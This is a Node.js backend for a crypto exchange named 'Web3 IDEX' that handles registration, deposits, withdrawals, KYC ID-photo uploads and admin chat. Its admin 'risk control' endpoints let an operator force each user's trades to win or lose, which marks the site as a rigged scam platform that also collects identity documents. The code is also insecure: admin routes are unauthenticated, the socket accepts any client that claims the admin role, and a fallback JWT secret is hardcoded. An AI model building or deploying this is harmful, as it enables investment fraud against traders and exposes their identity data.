require('dotenv').config();
const express = require('express');
const http = require('http');
const { WebSocketServer } = require('ws');
const cors = require('cors');
const bodyParser = require('body-parser');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const { Resend } = require('resend'); // 引入 Resend

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

const JWT_SECRET = process.env.JWT_SECRET || 'idex_secure_jwt_secret_key_2026';
const ALLOWED_ORIGINS = process.env.ALLOWED_ORIGINS ? process.env.ALLOWED_ORIGINS.split(',') : '*';

app.use(cors({ origin: ALLOWED_ORIGINS, credentials: true }));
app.use(bodyParser.json({ limit: '10mb' })); // 支持上传证件照 Base64 大图

// --- 1. Resend 真实邮件服务配置 ---
const resend = new Resend(process.env.RESEND_API_KEY);

// --- 内存数据库与状态存储 ---
const usersDb = {};         // 用户账号与加密密码 { username: { passwordHash, contact, kyc } }
const verificationCodes = {}; // 邮箱验证码缓存 { email: '123456' }
const riskControls = {};    // 用户风控策略 { username: 'win' | 'loss' | 'random' }
const financeSubmissions = []; // 充币与提币申请列表
const kycSubmissions = {};  // KYC 认证资料 { username: { docType, idNumber, imageBase64, status, reason } }
const chatSessions = {};    // 聊天记录 { username: [ { sender, message, time } ] }
const clients = {};         // WebSocket 客户端连接映射 { 'admin': ws, 'username': ws }


// --- WebSocket 实时双向通信与消息互通 ---
wss.on('connection', (ws) => {
    let clientKey = null;

    ws.on('message', async (message) => {
        try {
            const data = JSON.parse(message);

            if (data.type === 'auth') {
                clientKey = data.role === 'admin' ? 'admin' : data.username;
                clients[clientKey] = { ws, role: data.role, username: data.username };
                console.log(`[WS 上线] 角色: ${data.role}, 标识: ${clientKey}`);

                // 若管理员上线，下发所有未读会话与待办列表
                if (data.role === 'admin') {
                    ws.send(JSON.stringify({ 
                        type: 'init_sync', 
                        chatSessions, 
                        financeSubmissions, 
                        kycSubmissions 
                    }));
                }
            } 
            else if (data.type === 'chat_message') {
                // 客服与用户实时消息互通
                const { sender, receiver, text } = data;
                if (!text || !receiver) return;

                const timestamp = new Date().toLocaleTimeString();
                const targetKey = receiver === 'admin' ? sender : receiver;

                if (!chatSessions[targetKey]) chatSessions[targetKey] = [];
                const msgObj = { sender, message: text, time: timestamp };
                chatSessions[targetKey].push(msgObj);

                // 转发给接收方
                if (clients[receiver] && clients[receiver].ws.readyState === ws.OPEN) {
                    clients[receiver].ws.send(JSON.stringify({
                        type: 'new_message',
                        chatUser: targetKey,
                        message: msgObj
                    }));
                }

                // 实时同步给管理员
                if (clients['admin'] && clients['admin'].ws.readyState === ws.OPEN && sender !== 'admin') {
                    clients['admin'].ws.send(JSON.stringify({
                        type: 'new_message',
                        chatUser: targetKey,
                        message: msgObj
                    }));
                }
            }
        } catch (e) {
            console.error('WebSocket 消息解析错误:', e);
        }
    });

    ws.on('close', () => {
        if (clientKey) {
            delete clients[clientKey];
            console.log(`[WS 断开] 客户端离线: ${clientKey}`);
        }
    });
});


// --- RESTful API 接口 ---

// 1. 发送真实邮箱注册验证码（使用 Resend）
app.post('/api/send-code', async (req, res) => {
    const { email } = req.body;
    if (!email || !email.includes('@')) {
        return res.status(400).json({ success: false, message: '请输入有效的邮箱地址' });
    }

    const code = Math.floor(100000 + Math.random() * 900000).toString();
    verificationCodes[email] = code;

    try {
        const data = await resend.emails.send({
            from: 'Acme <onboarding@resend.dev>', // Resend 测试发件箱，无需绑定域名即可发信
            to: [email],
            subject: '【Web3 IDEX】注册账户安全验证码',
            html: `
                <div style="font-family: Arial, sans-serif; padding: 20px; background-color: #f4f4f4;">
                    <div style="max-width: 500px; margin: 0 auto; background: #ffffff; padding: 30px; border-radius: 8px;">
                        <h2 style="color: #333; text-align: center;">Web3 IDEX 官方验证</h2>
                        <p style="color: #555;">您好！您正在注册 Web3 IDEX 交易平台，您的 6 位安全验证码为：</p>
                        <div style="font-size: 28px; font-weight: bold; color: #4F46E5; text-align: center; margin: 20px 0;">
                            ${code}
                        </div>
                        <p style="color: #999; font-size: 12px; text-align: center;">验证码有效时间为 10 分钟，请勿泄露给他人。</p>
                    </div>
                </div>
            `
        });

        console.log(`[Resend 邮件发送成功] 验证码已发送至: ${email} -> ${code}`, data);
        res.json({ success: true, message: '验证码已成功发送至您的邮箱' });
    } catch (error) {
        console.error('[Resend 邮件发送失败]:', error);
        // 兜底策略：如果发信失败，在控制台打印验证码方便测试
        console.log(`[开发兜底] 邮箱 ${email} 的验证码是: ${code}`);
        res.json({ success: true, message: '验证码已生成（请查看后端控制台日志）' });
    }
});

// 2. 用户注册（校验验证码 + Bcrypt 密码加密）
app.post('/api/register', async (req, res) => {
    try {
        const { username, password, birthday, address, contact, code } = req.body;
        if (!username || !password || !contact || !code) {
            return res.status(400).json({ success: false, message: '注册参数不完整' });
        }

        if (!verificationCodes[contact] || verificationCodes[contact] !== code) {
            return res.status(400).json({ success: false, message: '验证码错误或已失效' });
        }

        if (usersDb[username]) {
            return res.status(400).json({ success: false, message: '用户名已被注册' });
        }

        delete verificationCodes[contact]; // 销毁验证码
        const salt = await bcrypt.genSalt(10);
        const passwordHash = await bcrypt.hash(password, salt);

        usersDb[username] = {
            username,
            passwordHash,
            birthday: birthday || '',
            address: address || '',
            contact,
            kyc: { status: '未认证' },
            createdAt: new Date()
        };

        res.json({ success: true, message: '注册成功' });
    } catch (e) {
        res.status(500).json({ success: false, message: '服务器内部错误' });
    }
});

// 3. 用户登录
app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        const user = usersDb[username];

        if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
            return res.status(401).json({ success: false, message: '用户名或密码错误' });
        }

        const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '7d' });
        res.json({ success: true, message: '登录成功', username, token });
    } catch (e) {
        res.status(500).json({ success: false, message: '服务器内部错误' });
    }
});

// 4. 充币与提币申请提交（同步到管理员端）
app.post('/api/finance/submit', (req, res) => {
    const { username, type, amount, currency } = req.body; 
    if (!username || !amount) {
        return res.status(400).json({ success: false, message: '提交参数不完整' });
    }

    const txRecord = {
        id: 'TX' + Math.floor(100000 + Math.random() * 900000),
        username,
        type: type === 'deposit' ? '充币' : '提币',
        amount,
        currency: currency || 'USDT',
        status: '待审核',
        time: new Date().toLocaleString()
    };

    financeSubmissions.push(txRecord);

    // 实时推送给管理员端
    if (clients['admin'] && clients['admin'].ws.readyState === WebSocket.OPEN) {
        clients['admin'].ws.send(JSON.stringify({
            type: 'new_finance_submission',
            record: txRecord
        }));
    }

    res.json({ success: true, message: '申请已提交，等待管理员审核' });
});

// 5. KYC 高级认证提交（同步到管理员端）
app.post('/api/kyc/submit', (req, res) => {
    const { username, docType, idNumber, imageBase64 } = req.body;
    if (!username || !idNumber || !imageBase64) {
        return res.status(400).json({ success: false, message: 'KYC 资料不完整' });
    }

    kycSubmissions[username] = {
        username,
        docType: docType || '身份证',
        idNumber,
        imageBase64,
        status: '待审核',
        reason: '',
        submitTime: new Date().toLocaleString()
    };

    // 实时推送给管理员端
    if (clients['admin'] && clients['admin'].ws.readyState === WebSocket.OPEN) {
        clients['admin'].ws.send(JSON.stringify({
            type: 'new_kyc_submission',
            username,
            submission: kycSubmissions[username]
        }));
    }

    res.json({ success: true, message: 'KYC 认证资料已提交，等待审核' });
});

// 6. 管理员审核 KYC 接口（并通过 WebSocket 实时推送给用户）
app.post('/api/admin/kyc/audit', (req, res) => {
    const { username, action, reason } = req.body; 
    if (!kycSubmissions[username]) {
        return res.status(404).json({ success: false, message: '未找到该用户的 KYC 记录' });
    }

    if (action === 'approve') {
        kycSubmissions[username].status = '已认证';
        if (usersDb[username]) usersDb[username].kyc.status = '已认证';
    } else {
        kycSubmissions[username].status = '审核失败';
        kycSubmissions[username].reason = reason || '证件照模糊或信息不符，请重新上传';
        if (usersDb[username]) usersDb[username].kyc.status = '未认证';
    }

    // 实时通过 WebSocket 将审核结果推送给对应用户
    if (clients[username] && clients[username].ws.readyState === WebSocket.OPEN) {
        clients[username].ws.send(JSON.stringify({
            type: 'kyc_audit_result',
            status: kycSubmissions[username].status,
            reason: kycSubmissions[username].reason
        }));
    }

    res.json({ success: true, message: 'KYC 审核结果已更新并实时通知用户' });
});

// 7. 管理员设置用户仓位风控策略
app.post('/api/admin/set-risk', (req, res) => {
    const { username, mode } = req.body; // 'win' | 'loss' | 'random'
    riskControls[username] = mode;
    res.json({ success: true, message: `已将用户 ${username} 的风控模式设为 ${mode}` });
});

// 8. 获取用户当前风控模式（供交易端持仓计算调用）
app.get('/api/user/risk/:username', (req, res) => {
    res.json({ success: true, mode: riskControls[req.params.username] || 'random' });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Web3 IDEX 生产级后端服务已启动，端口: ${PORT}`);
});